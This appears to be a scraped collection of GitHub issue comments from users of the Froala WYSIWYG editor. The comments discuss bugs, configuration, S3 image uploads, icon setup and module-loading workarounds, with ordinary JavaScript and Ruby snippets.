anything that rely on classes (not supporting image alignment, etc.). If I were I'd probably go with something like Premailer.\n. Oh cool. Not sure what classes @gisheri is talking about by I may try out this option at some point :+1: \n. I think http://jsfiddle.net/49bm6jxu/1/ is a better example of what @wojcikstefan is trying to say\n. Sorry - I included the wrong JS fiddle.\nhttp://jsfiddle.net/dh9z26u4/\n1. click twitter image\n2. make it a link\n3. look at the html -- the link tag is wrapped around all the images instead of just the one\n. This definitely still a problem here. Try adding a separate link to for each of the social media icons. Then flip to the HTML and back and see if the HTML makes sense to you.\nAlso, I think the CSS/font paths are broken in the latest master?\n. a +1 for a more automated way to get the source code. Would still prefer some git access since I frequently have to run non-released versions to get bug fixes and there's no easy way to do that now. Wish I could just git pull.\n. disagree that this should be the default behavior. that's not how most other UI (e.g. textareas) works.\n. I agree that something is wrong still. See a modified example http://jsfiddle.net/r4tLxL16/ which points to the latest master and shows how you'd expect it to work with a textarea \n. Though @frankrue in your example the curly quotes are still visible in the alert -- it's just that they are no longer HTML encoded, but it's not strictly necessary to html encode them. However if you try to use a < sign via &lt; there is a problem\n. Hmm ok I didn't realize it was valid HTML to have unescaped stuff like <em> directly inside a textarea. \nAt a high level, would you agree that the following usage/workflow should always work without problem?\n<textarea class=\"froala\"><?php echo htmlspecialchars($html, ENT_QUOTES); ?></textarea>\nwhere $html is the actual HTML that you'd expect to print on a webpage or in an html email? And besides exceptions for security reasons and allowedTags, etc., the editor should display all the content the same as if displayed on a webpage? And getHTML() should also return the same HTML that you started with?\n. Ok great. I realize now my jsfiddle example above doesn't make sense for the < character - I forgot an encoding.\n. narrowed it down for you...\nhttp://jsfiddle.net/obccw2d3/\npaste this code in the html side\n<ol>\n  <li><strong>put your cursor at the end of this line and hit enter 5 times</strong></li>\n</ol>\n<strong></strong><br>\n<strong></strong><br>\n<strong><em></em></strong><br>\nthen follow its instructions\n. :+1: \n. Froala did that automatically when pasting an image, if you didn't have image uploading configured. But it was problematic in our case (since some email clients don't like receiving images this way). Overall you should probably use the Image Upload feature of Froala instead.\n. ... So? If it looks bad on OS X that's a Froala CSS issue IMO\n. +1\n. Aha, I see now that I had only renamed it in 1 of the 2 places. Thanks!\n. Thanks!\n. Using these values as href works:\n{{lead.display_name}}\n{{lead.custom.[Leads]}}\nHowever values with spaces, etc. get HTML escaped:\ne.g. Using an href of:\n{{lead.custom.[Org Discount $]}} \nproduces an href of:\n{{lead.custom.[Org%20Discount%20%24]}}\nIs this fixable?\n. @stefanneculai Any thoughts on this comment above?\n. This still doesn't behave how I would expect. \nGo to http://jsfiddle.net/t4Lsqprp/ and toggle between regular & code view.\nThe code review becomes smaller than the wysiwyg view which is silly especially because the code view now requires a scrollbar to view it's content.\n\n. I see you made a change, and that it works better now. But now if you look at empty content there's movement when toggling between them: http://jsfiddle.net/v08t7Lzd/\n. No, I mean the height of the entire editor gets larger slightly when switching to code. \n\n. Better!\nhttp://jsfiddle.net/umxv78vg/ is example now where you might actually want to code view to get bigger than the editor (up to heightMax, of course) so that you can edit the code without having to use the scrollbar unnecessary.\n. Similarly, if I start typing more HTML the textarea should autogrow like the editor does, up to heightMax\n. Looks good, thanks\n. Actually, starting in 3adca63 switching to the code view freezes my browser both in Firefox & Chrome. I can't reproduce it in a fiddle, but I can reliably reproduce in my app that on 3adca63 switching to code view freezes the browser, and reverting to b46598b removes the problem.\n. Definitely still an issue ever since 3adca63e4b03b84ea15b40c3e452f32c3d53bbe0 through current master. I can provide a link, but we'll need to be online at the same time for it. I've pinged you; ping me back when you're available and I probably can be too.\n. Thanks, that helps a bit, though it also makes a repetitive label show up in Insert Image by URL:\n\nI wouldn't mind the label there so much if it said \"URL\" instead of \"http://\". Currently I'm hiding it with more custom CSS.\n. thanks, fixed here http://jsfiddle.net/wzttb2vu/\n. thanks! fixed here http://jsfiddle.net/yf6f9e6a/\n. This is a bug, no? If not, then the documentation should be updated...\n. Is the alignment plugin necessary for these buttons to work?\nIf so then I'd suggest you not display these buttons at all if the alignment plugin isn't included.\n. Okay. But it's not obvious to me: is the align plugin necessary for the align buttons to actually function on images?\n. Okay cool. I just wasn't sure if you fixed the actual displaying of the buttons and so I was asking about the actual functionality of image alignment.\nThx.\n. I can't remember if we solved this particular icon or just removed it, but yes we do use Glyphicons (only) for all our Froala icons in production -- here's the code we use:\n```\n        // Configure Froala to use Glyphicons instead of Font Awesome, since we already use it.\n        // https://www.froala.com/wysiwyg-editor/v2.0/docs/concepts/custom-icon\n        // We use a mix of Halfings and Glyphicons because:\n        // - Halflings are designed for the size we are showing them at and the Glyphicons version of some\n        //   icons (e.g. list-numbered) isn't clear enough compared to the designed-for-small Halflings version.\n        // - Some icons aren't in the Halflings pack so we use Glyphicons for those.\n        $.FroalaEditor.DefineIconTemplate('glyphicons', '');\n        $.FroalaEditor.DefineIconTemplate('halflings', '');\n        $.FroalaEditor.ICON_DEFAULT_TEMPLATE = 'halflings';\n    $.FroalaEditor.DefineIcon('bold', { NAME: 'bold' });\n    $.FroalaEditor.DefineIcon('italic', { NAME: 'italic' });\n    $.FroalaEditor.DefineIcon('insertLink', { NAME: 'link' });\n    $.FroalaEditor.DefineIcon('linkOpen', { NAME: 'new-window' });\n    $.FroalaEditor.DefineIcon('linkRemove', { NAME: 'trash' });\n    $.FroalaEditor.DefineIcon('insertImage', { NAME: 'picture' });\n    $.FroalaEditor.DefineIcon('templateTags', { NAME: 'magic', template: 'glyphicons' });\n    $.FroalaEditor.DefineIcon('html', { NAME: 'embed', template: 'glyphicons' });\n    $.FroalaEditor.DefineIcon('formatOL', { NAME: 'list-numbered' });\n    $.FroalaEditor.DefineIcon('formatUL', { NAME: 'list' });\n    $.FroalaEditor.DefineIcon('imageAlt', { NAME: 'info-sign' });\n    $.FroalaEditor.DefineIcon('imageSize', { NAME: 'resize-full' });\n\n``. Okay, this is unexpected / less than desirable for a HTML email editor where you'd like to preview the exact HTML that's going to be sent.\n. I understand, but to me CSS inliner is more of a raw coder's tool where you are intentionally typing custom html/css and then you just want it \"ready for email\" at the end. Whereas in a WYSIWYG editor like Froala I'd expect the code view to accurately reflect what code is going to be sent to the server, etc.\n. I'd just like to reiterate that it's very much undesired to have \"fr-\" classes show up in the HTML/source view of the editor, e.g.class=\"fr-draggable\"which gets added to images regardless of theuseClasses` setting. The HTML is ugly / unnecessary from the user's point of view, and confuses users why undesired classes get added to their HTML to begin with, and also confusing that the viewable HTML is different than the \"output\" HTML.\nDo all WYSIWYG editors behave this way?\n. This seems dumb. Even with an iframe, shouldn't I be able to use CSS to apply some basic styles to control what font & color the Froala editor displays, without having to have every page style outputted as inline styles and polluting the HTML?\nOverall I want to use 'useClasses: false' because the outputted HTML should not have any fr- classes in it since they pollute the HTML and the stylesheet with those classes won't appear in the result. However that doesn't mean I suddenly need you to try to pull in every computed style. \nMy goal of using Froala editor is not to have a pixel for pixel match of every character in the outputted HTML. Rather the editor should give users a way to provide some very basic/limited formatting options (as setup by allowedTags, toolbar buttons, etc.) and output clean HTML with just enough styles needed to make those options work.\n. I'm gave iframe: true a shot, per your recommendation (and can workaround #1419), however extra styles are appearing in the iframe <head> even though I'm not setting any custom iframeStyle:\nhtml{margin: 0px;}body{padding:10px;background:transparent;color:#000000;position:relative;z-index: 2;-webkit-user-select:auto;margin:0px;overflow:hidden;min-height:20px;}body:after{content:\"\";display:block;clear:both;}body, body:focus{outline: transparent solid 0px;}body{position: relative; z-index: 2; -webkit-user-select: auto; background: transparent;}body a{-webkit-user-select: auto;}body.fr-disabled{-webkit-user-select: none;}body [contenteditable=\"false\"]{-webkit-user-select: none;}body [contenteditable=\"true\"]{outline: transparent solid 0px;}body img{cursor: pointer;}body ul{list-style-type: disc; margin-left: 25px;}body ol, body ul{margin-bottom: 10px;}\nThis is causing useClasses: false to inherit unnecessary styles such that a simple link causes a $textarea.val() to have this HTML:\n<a href=\"http://example.com/\" style=\"-webkit-user-select: auto;\">link</a>\nMy real goal is just to have the outputted HTML to be as simple and clean as possible. I don't want any fr- classes in the output since these are emails. And I only want the bare minimum styles needed to display the basic formatting options I've provided my users (bold, italic, lists, links, img). I'm not trying to create a pixel for pixel match (email clients would probably mess this up anyway) and I want to be able to customize basic styles in the editor (e.g. font family or font color during composition) without those styles polluting the HTML.\n. The previously suggested workaround from v1, while very ugly, at least worked better than the options I'm seeing in v2 so far.\n. This should be documented then. I have always initialized Froala on elements not yet in DOM, so suddenly switching to iframe: true shouldn't led to a Froala internal error without documentation or a better error message.\n. Before I was using iframe: true there was another case where I was able to initialize the editor outside of the DOM and then once it was added to the DOM I had to \"refresh\" something. Here's my code snippet (in order for the placeholder to appear properly):\n``` js\n        // If the HTML editor is initalized on a textarea that wasn't in the DOM at the time\n        // then call this method after it is in the DOM.\n        htmlEditorAddedToDom: function() {\n            var $textarea = this._htmlEditorTextarea;\n        // Fixes a font-size issue of the placeholder text where it changes size upon first focus\n        $textarea.froalaEditor('placeholder.refresh');\n\n        // ... some other smarter height-adjustment code I set\n    },\n\n```\nWould it make sense or be possible to do some or the bulk of the initialization work on an iframe froala element before the element is in the DOM, as long as we notified Froala once it was in the DOM?\n. If it works when dragging from Finder / filesystem but not from Chrome download bar, then it may be due to this bug: https://bugs.chromium.org/p/chromium/issues/detail?id=234931\nApparently this bug is fixed already in Chrome Canary (though I haven't verified)\n. Thanks. Later when I want to cleanup the editor, can I simply run $textarea.off('froalaEditor.initialized') and it will fully clean everything up, or do I also need to somehow unbind the keydown event too, since you're binding that also?\n. Okay, to confirm - on latest master, I can simply call $textarea.froalaEditor('destroy') without ever having to separately call $textarea.off('froalaEditor.contentChanged'); or $textarea.off('froalaEditor.initialized'); -- those will automatically be cleaned up now?\n. I'm looking into this keydown further and was pretty surprised by what I saw. \nSee the comment block inside froala.initialized in http://jsfiddle.net/15a64z2n/\nBasically, return false; is both preventing the default newline (this is kind of expected) and it's un-preventing the keydown event from bubbling up to the form's handler.\nIs this how you expect it to work?\n. Just to provide a bit more context of what I'd ideally be looking for\n- I'm using Froala for email composition so using iframe: true sounds like it makes sense to keep it isolated from the container page's styles.\n- I'd like to be able to make some minor customizations to the default CSS that is used in the editor itself, without having all of those changes propagate in the output HTML.\n- Gmail is a great example of this. In Gmail I can compose HTML email and have the \"default\" font during composition display as Arial (instead of Times Roman) in my browser. However if you inspect the HTML of the emails they send, they aren't hardcoding any font styles in the sent email. \n. Looks like they are moving away from allowing those.\nBut regardless, it'd be nice if you could allow me to just specify a URL rather than having you construct it yourself. I should not have to provide Froala both a bucket name and region... it complicates things in multi-region setups.\n.

Final question (just confirming since the source isn't online) -- by adding uploadURL I can remove both region and bucket, right?\n. @stefanneculai I don't think that really does what I'm asking.\nI shouldn't have to care whether the user is in wysiwyg mode or code mode. At some point they hit \"Save\" or \"Send\" or whatever and I need to get the latest editor html/value at that point. \n. If the user is in code view and html.get is called then it should return the same as if the user switches back to Edit mode and then I call html.get\n. Okay, but don't you see how my case of simply wanting to having the following is not super special and should be solved in as few lines of code outside of Froala as possible?\n1. Have a Froala editor\n2. Have a Save button\n3. User expects Save button to save their work\n. Didn't you say that would skip the cleaning stage? Basically what I'm saying is that my \"step 3\" should return the exact same html output regardless for all the following:\n1. user is in wysiwyg mode and hits save\n2. user is in wysiwyg mode, switching to code view, and hits save\n3. user is in code mode and hits save\nAnd I should be able to request this with a simple call into froala.\n. Thanks, that's helpful and will use that.\nI'm not saying necessarily that the html.get method should do this. But what I'm trying to communicate is that I suspect that almost ALL of your users who use the Code plugin will either run into this problem. For many they will have this problem and not realize it but their users will experience bugginess / unsaved data. I'm not saying html.get should be the method, but I'm saying that you should have a single interface for getting the latest/cleaned HTML that handles this under the hood.\n. That's smart. Just think you shouldn't make it any harder for people handling their own submissions.\n. Thanks, that works great. I'm using this now instead of what you recommended in #1475\n. Thanks - I didn't really want to include the droppable plugin, but I see that by using froalaEditor.initialized to do the event binding, the droppable plugin isn't necessary.\nJust FYI, here's the actual use case I was dealing with:\nhttp://jsfiddle.net/1kL1prmc/\nWithout the Froala drop event, I had the following situation:\n- (GOOD) drag a file somewhere on the page, my custom dropzone appears\n- (GOOD) stop dragging a file over the page, my dropzone disappears\n- (GOOD) drop the image in the Froala Image Popup \"Drop Image\" section -- my dropzone disappears after\n- (BAD) drop the image in the Froala Editor section -- my dropzone did NOT disappear after\nIf you have a better idea on how to solve that, let me know.\n.

Is there a way to disable this behaviour in a way that the current tag is not spliced and instead the content is wrapped in a paragraph tag before it is spliced ?\n. Great, Thank you for the help. I'll look into it. :)\n. I personally think that this is great for list items and paragraphs. But for any other items, particularly divs and buttons (a tags) that are styled it does not work very well. Duplicates the buttons into two, duplicates content boxes etc.\nA user's intention is to split the text block only (add a paragraph / split the block into paragraphs) by hitting return. For now I'll just wrap 'p' tags around any text nodes not directly within 'p' tags before the editor is initialised on the content.\n. awesome ... looking forward to 2.0.0 :)\n. I'll definitely try this, seems quite straightforward :) . Thank you Stefan !. Please check : https://codepen.io/anon/pen/qXPXjo. In the pen's froala editor, you'll see the undo button is disabled. Then perform an action in the editor like typing a letter. The undo button becomes active, click it once and it removes the letter you just typed, and click it again and it goes to the previous state without the \"Hello world\" text.\nThere seems to be no way to undo to the original state without clicking in the editor and performing an action.. Thanks guys @largeden @stefanneculai  ... Looks good, I can't believe I struggled with that :). Appreciate all the help.. Yes, only in Edge though.\nWe are probably going to circumvent this by adding a class to the container before initializing Froala and then specifying that class in the htmlAllowedEmptyTags, in case this issue is not resolved.\nCheers and happy holidays ! :)\n.

The description \"The list of tags that are removed together with their content.\" of the htmlRemoveTags options loose it's sense when there is the htmlAllowedTags option. The htmlRemoveTags option is perceived as a list of tags which content is removed every time when the tags are removed by user.\n. How it works: when you set the paragraph text align which is the same as its parent text align, the paragraph text align is reset to inherit.\n. Got it. Thanks!\n. @stefanneculai I don't imply the case when a user wants to make a big gap by typing multiple spaces. I imply the case when a user needs to make 2 words to always stay on a single line. For example, phone numbers (+40 21 460 4260) or values and their units (2\u03c0\u00a0rad) are strongly desired to be not wrapped to separate lines, and non-breaking space can solve this issue. But user can't do it in the editor because the editor replaces non-breaking space between the words to a regular space. . I think this problem is caused by browsers because a plain contenteditable element behaves the same way.. There is no such bug on macOS. @tmpg I use the latest macOS (10.12.2) with the latest Safari (10.0.2), Chrome and Firefox. When I click an emoticon in the toolbar, one emoticon and spaces around are added. The emoticon itself is removed by single backspace button click.\nEmoticon.mov.zip\n. The bug also occurs in desktop Safari.\nExpected behavior.\nIt is possible to place the cursor to an image caption by clicking it. And it is possible to edit the image caption without going to the source code.\nActual behavior.\nThe cursor is not placed on an image caption (a click on the image caption does nothing).\nSteps to reproduce the problem.\n\nMake an editor instance with enabled images and image captions. You can get a ready instance here.\nInsert an image to the editor.\nClick the image.\nAdd the caption to the image.\nClick the caption.\n\nOS.\nmacOS 10.12.6 (didn't test in other versions)\nBrowser.\nSafari 10.1 and 11.1 (didn't test in other Safaris). The bug doesn't occur in Chrome and Firefox.\nP.S. I join the question about figure and figcaption. I also implemented image caption, I used\nthe tags in the implementation and it works well.. @stefanneculai \n\nNow, coming to the figure and figcaption. We chose not to use them because browsers do not allow using the figure tag inside p tags. Thus, having images with captions inside p tags wouldn't be possible. We are really interested in finding out more details about what you think on this matter as we've had lots of talks about it before doing this change.\n\nHere is my image caption implementation: https://gist.github.com/FinesseRus/7086abcc731a54a159cdf34cdf3e860b. It is a plugin that automatically adds a caption to all images. It takes a text for the caption from the alternate text. The figure and figcaption are displayed well on a webpage. The only problem is that the resizing doesn't work properly for inline images with a caption.. @stefanneculai I understood you correctly. You are right, figure really splits the paragraph.\nPerhaps paragraph split is such a rare case that even my users have never complained about it therefore I didn't notice it.. @largeden What the problem of using the figure tag for multiple pictures in a single line? I think it can be a problem only if you want to add a text to that line (who really needs such case?). If it is not a problem, why is figure tag not correct for the Type B?. @largeden You can make a bunch of images stay on a single line using float: left. Why do you need an image inside a paragraph?.

    "p1Machado": "@sabanaqvi the reason why s3 is warning \"Extra input fields: x-requested-with\" is that Froala sets this field in every upload to s3 form. So you need to build your policy based on every field that has on the request form.\nYou can add a statement in the policy like: { \"x-requested-with\": \"xhr\" }, ou like @ahmadajmi already did: [\"starts-with\", \"$x-requested-with\", \"xhr\"], which means that s3 will check if the value of the field \"x-requested-with\" starts with \"xhr\".. I now this issue is old, but I want to show how I did to upload a image and insert it with cloudfront.\nUsing the event .on('froalaEditor.image.beforeUpload', function (e, editor, images), I did the upload by myself and retrieved the object key. Then used editor.image.insert(cloudfront_object_url) to let Froala do his thing with the image. Last return false to stop the Froala standard upload flow.\ndocument.addEventListener(\"DOMContentLoaded\", function(){\n      $('#text-editor').froalaEditor({\n      }).on('froalaEditor.image.beforeUpload', function (e, editor, images) {\n        var file = images[0];\n        var xhr = new XMLHttpRequest();\n        var form = new FormData();\n            var fileKey = \"banana\";\n            form.append(\"key\", fileKey);\n            form.append(\"AWSAccessKeyId\", \"<%= ENV['AWS_ACCESS_KEY_ID'] %>\");\n            form.append(\"acl\", \"private\");\n            form.append(\"policy\", \"<%= policy_attachment %>\");\n            form.append(\"signature\", \"<%= signature_attachment %>\");\n            form.append(\"Content-Type\", \"image/jpeg\");\n            form.append(\"file\", file);\n            xhr.open(\"POST\", \"https://blablabla.cloudfront.net/\", true);\n            xhr.onload = function() {\n              if (this.status >= 200 & this.status < 300) {\n                editor.image.insert(\"https://blablabla.cloudfront.net/\" + fileKey);\n              }\n            }\n            xhr.send(form);\n        return false;\n      })\n    });. @siasjustin \nMy strategy to generate the filekey was a combination of the {user_id}/{object content's hash}. If I remember, guess it was a MD5 hash.\nThe policy and signature is required for AWS S3. Which is storing the objects.\nI did it like that:\n```\nrequire 'base64'\nrequire 'openssl'\nrequire 'digest/sha1'\nclass S3Signer\n  class << self\n    def policy_data(key_condition)\n      Base64.encode64(\n        {\n          \"expiration\": 1.day.from_now.iso8061,\n          \"conditions\": [\n            {\"bucket\": \"blablablabucketname\"},\n            [\"starts-with\", \"$key\", key_condition],\n            {\"acl\": \"private\"},\n            [\"eq\", \"$Content-Type\", \"image/jpeg\"]\n          ]\n        }.to_json\n      ).gsub(\"\\n\", \"\")\n    end\ndef signature_data(policy)\n  Base64.encode64(\n    OpenSSL::HMAC.digest(\n      OpenSSL::Digest::Digest.new('sha1'),\n      ENV['AWS_SECRET_ACCESS_KEY'], policy)\n    ).gsub(\"\\n\", \"\")\nend\n\nend\nend\n``\nThis pair of tokens are used to determine what your server allows the client side to upload. The attribute[\"starts-with\", \"$key\", key_condition],` is describing that the fileKey must start with the content you want. In my case, the fileKey must always point the \"{user_id}/\"\nAll this configuration details is a quite confusing, you will need to dig into the docs.\nGood luck :+1: . ",

Possibly an authenticated git repository with our paid account credentials?\n. @stefanneculai  BitBucket has free git repository hosting for small teams of 5. You currently have 2 contributors on this repository. Thoughts?\n. Something else that you could do is to use your own private repository and have the unminified version available through a scoped npm module. For example Fontawesome5 does a really good job with this. Take a look at how they implement paid vs. free content. Your free version could be built off of this existing github repo, and a paid version could be built off a private version. . Here's how I solved my problem. It'd be nice if this was provided by the package as an option. \n``` javascript\nthis.element[0].addEventListener(\"keydown\", function (e) {\n  if ((e.which == 13 || e.which == 10)) {\n    e.stopImmediatePropagation();\n    e.preventDefault();\nif (e.shiftKey) {\n  if (self.editor) {\n    self.editor.cursor.enter();\n  }\n} else {\n  // do my custom thing... \n}\n\n}\n}, true);\nthis.element.froalaEditor();\n```\n. Ah. I see. Excellent. Thank you for your response!\n. @nicooprat here: https://jsfiddle.net/gxoh9xL9/7/\nshould do what you want it to do... \n. @nicooprat no mine was the typo... You may not need the stop immediate propagation ... Sorry for the non formatted typing. Responding from my phone.\n. @nicooprat \nFirst, the reason why my first example worked was definitely because of the typo. It was actually throwing an error thus stopping the execution of the javascript. \nHowever, that made me realize why your example wasn't working in the first place. The boolean parameter for the events.on('keydown', () => {}, true) tells Froala to bind the event before Froala's internal events. Since you were initializing Froala before you established this event listener there's no way for Froala to bind yours first. Therefore, you must bind your events first and then initialize Froala. See my updated jsfiddle here: https://jsfiddle.net/gxoh9xL9/8/\n. @stefanneculai what information do you need? My question to you is mainly, what could potentially cause this? I assume you have a piece of code that runs on scroll event that should toggle .fr-sticky-on and .fr-sticky-off? That trigger is not happening until the focus, unfocus event. \nI honestly don't expect you to be able to reproduce it. I'm just looking for some insight as to why or how this could happen. I guess I'll download the  un-minified copy of the source code and read it for myself. Would this be more appropriate to submit as a ticket to our paid account support?\nHere are my options: \nvar opt = {\n                heightMax: this.options.maxHeight,\n                heightMin: this.options.minHeight,\n                toolbarBottom: this.options.toolbarBottom || false,\n                toolbarSticky: this.options.toolbarSticky || false,\n                toolbarStickyOffset: 66, // the height of the bread crumb wrapper\n                toolbarInline: false,\n                theme: 'gray',\n                spellcheck: true,\n                enter: $.FroalaEditor.ENTER_BR,\n                htmlRemoveTags: ['script'],\n                imageDefaultDisplay: 'inline',\n                imagePaste: false,\n                imageMove: false,\n                imageResize: false,\n                imageDefaultWidth: 200,\n                // image upload options\n                imageUploadParam: \"files[]\",\n                imageUploadURL: top.CONTEXT + '/api/' + self.options.container().id + '/files/?_st=' + top.CSRF_TOKEN + \"&inline=true&editor=froalaV2\",\n                imageUploadMethod: \"POST\",\n                imageMaxSize: maxUploadSize,\n                imageAllowedTypes: [\"gif\", \"jpeg\", \"jpg\", \"png\"],\n                // file upload options\n                fileUploadParam: \"files[]\",\n                fileUploadURL: top.CONTEXT + '/api/' + self.options.container().id + '/files/?_st=' + top.CSRF_TOKEN + \"&inline=true&editor=froalaV2\",\n                fileUploadMethod: \"POST\",\n                fileMaxSize: maxUploadSize,\n                fileAllowedTypes: this.options.imageOnly ?

That was it! I hadn't set the scrollableContainer option. I hadn't set the \"scrollableContainer\" option; the default of \"body\" was invalid because it wasn't the body that was scrolling.\n. Do you have a base jsfiddle with all the libraries included? \n. This is purely a scrollableContainer issue. I didn't realize how important this option is... perhaps it should be heavily emphasized in the documentation. But as far as this issue is concerned, it's not a problem.\n. I also can do this, but it's kind of ugly.\njavascript\n this.editor.codeView.get().replace(/[\\t\\n]+/, \"\");\nto normalize the output, but I don't really like that... what if it's formatted with spaces per the codeMirrorOptions, etc.\n. I'm guessing it's this enhancement for 2.3.3: Cut/copy images inside the editor. If it's cut/copy inside the editor why would it bind to the window... I can be unfocused on the editor and Cmd + C and it get's caught in the editor. This seems like an undesirable outcome.\n. Excellent thank you!\n. Here's my \"solution\". I'd be interested to hear your thoughts on it. \n``` javascript\nopts = {\n  fileUploadURLFunc = function (return '/api/' + this.container().id + '/files';),\n  ...\n};\nthis.element.on('froalaEditor.file.beforeUpload', function(e, editor, files) {\n editor.opts.fileUploadURL = editor.opts.fileUploadURLFunc(); \n}).froalaEditor(opts);\n```\nThis seems to do the trick, but it feels odd to have to set an internal option before each upload. What are your thoughts on accepting a function as the value for fileUploadURL and imageUploadURL and then at runtime doing something like:\njavascript\nvar uploadURL = typeof editor.opts.fileUploadURL === 'function' ? editor.opts.fileUploadURL() : editor.opts.fileUploadURL;\n....\n. Will do. I really appreciate your feedback. It's been invaluable to us over the last few weeks! Keep up the good work! \ud83d\udc4d \n. Just spent a few minutes trying to get what I thought were the conditions that would cause it in a jsfiddle, but no luck. I'll see if there's anything else I can do to get it into a nice example.\n. @stefanneculai I cannot seem to reproduce in jsfiddle. Perhaps it's something we are doing, I'll investigate that further. If at some point I can reproduce in an environment  you can see, I'll reopen. \n. At further investigation, it seems like our user actually initiated a native paste event that triggered this.. Excellent thank you! I always appreciate how fast you guys are to respond!. @stefanneculai this hard to setup a jsfiddle for since I can't use unminified code in order to tell if I'm hitting the block of code correctly. Regardless it's more of a conceptual thing. I think the math should be p_offset + top + obj_height not p_offset + top + height. . @stefanneculai any further thoughts on this?. @stefanneculai okay, I'll see if I can reproduce it... thanks for reviewing it. . Awesome ty :). @stefanneculai nope we were on 2.5.1 at the time. We will upgrade. Thanks!. excellent ty. This is my workaround:\njavascript\n           .on('froalaEditor.file.error', (e, editor, data) => {\n                if (data.message) {\n                    editor.popups.areVisible()\n                        .find('.fr-file-progress-bar-layer.fr-error .fr-message')\n                        .text(data.message);\n                }\n            }). @stefanneculai okay, I know my workaround works, but is that what you would actually recommend doing; or do you have a better suggestion? . Fantastic ty. There should be a way of dynamically injecting these during initialization.. Oh Excellent thank you!. @stefanneculai I'll try to setup something in jsfiddle. I understand you depend on the events as well, but it causes some pretty awful behavior on the rest of the application; especially on a mobile phone since the keyboard opening and closing causes these events to trigger. I'll try to show you.. ",

Of course there would need some changes to your billing system.\nOne other option is GitLab.com which offers free private repos with unlimited collaborators:\nhttps://about.gitlab.com/pricing/\n.

I have to change the minified version of froala to make it work. I'm not against your business plan, we are planning to buy oem license, but at least with open-source I could have submit a PR.. Nope. There really is a bug. Did you try to work with tools like webpack or rollup, either with CJS or ES6 require / import?\nSo I'm saying it again, please flag it like a bug and either fix it or help us help you to fix it.\n. Yeah I cheated too, but really not a big fan.\nHow should I feel if a client tell me that a form in my app do not work on his mobile and I tell him it's not a bug as it works through is desktop.\nSame here.. @stefanneculai but we should not have the be forced to shim! You already did 75% of the job adding an UMD loader with jQuery imported as dependency, there is just one and only one remaining call to a global jQuery in your code. Just use the imported jquery instance and that bug is fixed or allow me to PR and I'll do it for you.. Hooo my bad I completely did not see this release!\nThen no need to shim for jQuery anymore!. @stefanneculai just tested and indeed it works now.\nJust need to add a main entry in your package.json so one can simply do require('froala-editor') instead of require('froala-editor/js/froala_editor.min') without using webpack alias (yeah see you coming @jwhitmarsh ;) ).\n. Found it, we are using our own css and your code depends on fr-visibility-helper to find the size index using css media queries. I dont know if it's clever but that's surprising.. I just select all with ctrl+a\n\nAt the end I just click inside the list and the button appeared selected again. If you follow exactly what I said you will reproduce it.\n\ngot to https://www.froala.com/wysiwyg-editor\nclick inside the editor\nctrl+a\ndel\nclick on list button\nwrite a line\nhit enter\nwrite a second line\nhit enter\nwrite a third line\nclick on paragraph style / gray\nclick on list button\n\nThe 3rd paragraph is now not a list but also not gray. As webpack (and maybe other builders) are also AMD compatible, they are using the AMD definition if it is the first definition. AMD or CJS should return the same thing. A better template would be\n```js\n// Uses CommonJS, AMD or browser globals to create a jQuery plugin.\n(function (factory) {\n    if (typeof define === 'function' && define.amd) {\n        // AMD. Register as an anonymous module.\n        define(['jquery'], factory);\n    } else if (typeof module === 'object' && module.exports) {\n        // Node/CommonJS\n        module.exports = function( root, jQuery ) {\n            if ( jQuery === undefined ) {\n                // require('jQuery') returns a factory that requires window to\n                // build a jQuery instance, we normalize how we use modules\n                // that require this pattern but the window provided is a noop\n                // if it's defined (how jquery works)\n                if ( typeof window !== 'undefined' ) {\n                    jQuery = require('jquery');\n                }\n                else {\n                    jQuery = require('jquery')(root);\n                }\n            }\n            return factory(jQuery);\n        };\n    } else {\n        // Browser globals\n        return factory(jQuery);\n    }\n}(function ($) {\n    $.fn.jqueryPlugin = function () { return true; };\n    return $;\n}));\n```\nThis will return jQuery no matter what loader system you are using. But I would prefer Froala constructor instead ;)\nreturn $.FroalaEditor I presume by reading your minified src.. nope, seems like the issue is solved!\nYou can close this @stefanneculai @dianaprajescu . I still reproduce it when following the steps to reproduce the issue. Is https://www.froala.com/wysiwyg-editor using the current master?. I dont know how to record on Android but I could try I guess... Did you try with the same steps, same Android version, same Chrome version like I wrote above?. Actually I was wondering if it was the same, thank you.\nWhy cannot we set a value below 500? I would to be able to set it to 150.. I figured out the debounce is for performance reason but as I am not using a lot of formating features I would like to have the liberty to test for myself the minimum delay I could set to improve UX without compromising performance.. > Under 500 you would kill browser performance.\nCan you let me judge of that in my app and make it configurable?. In fact, even if the doc says it cannot be set under 500, it is possible. I just set it to 150 and it works very well. No performance issue at the moment, but like I said, I do not use a lot of plugins & features, and the editable texts are not that big.. I think I just understand why I expected a different result. My button add a span with gray color. Italic add a em. It happens only when italic is after gray, which make the selection.element() bump to the parent, but still having selection.text() correct.\nI was expected the selection.element() being the span, because it is really selected\n1. <p>foo bar</p>\n2. foo being selected a gray-ed\n2. <p><span>foo</span> bar</p>\n3. italic applyed\n4. <p><em><span>foo</span></em> bar</p>\n5. italic removed\n6. <p><span>foo</span> bar</p>\n7. selection.element jump to <p> whereas selection.text still being foo thus me removing active status on button gray whereas should be still active\nI update the initial issue with a better example. Nope, the selection is inside the <em> please read carefully the step by step example.\nAt the end the selection.element is the <p> which contains foo bar whereas selection.text is foo. selection.element should be <span>foo</span>. I updated the previous steps, seems like overflow-x: hidden has a bigger influence. Seems like it, also I did not have the bug with current Chrome & Firefox. Will check again when #2004 will be closed. @stefanneculai we still have the issue on 2.6.2, so it appears it was not the same as #2004. We will try to make a codepen of fiddle asap. Could you re-open this issue meanwhile?. Nope sorry, false alarm, we were in 2.6.1 on one component :pray: \nIssue solved with 2.6.2 :+1: .

    "frankrue": "I was following that discussion, but it doesn't solve the problem. Ignore HTML tags inside of HTML for a moment, and simply use something as obvious as a decorative open and closing pair of double quotes (&ldquos; and &rdquos;) from my previous example.\nEven if you put them into a froala editor based on a <div></div>, they are still returned incorrectly with the getHTML method.\n\"Well then just don't do that,\" isn't an option for a WYSIWYG editor in this example.\nHere is an updated example: https://jsfiddle.net/eqsp2fww/4/\n. @philfreo Yes\u2014my example is merely for ease, since 99% of designers building websites will choose a webfont and expect characters like a right single-quote (\u2019) to be used in place of a straight tick (') in possessives within headlines and body copy. Using them as-is (no escaping) would require that every element in the pipeline be encoded exactly the same, which isn't always possible. For instance, on many webhosts, there is no option to choose encoding of a given table within MySQL. This is the case in my actual production environment. So when these characters are stored, then retrieved and then rendered in HTML, they are garbled and confused with other characters.\nObviously, your example shows a great deal more information and probably a better use-case for serious concern. That this issue and the other issue mentioned are closed is my objection. The statement by another user: \"Seems like the easiest approach would be to avoid using a textarea and 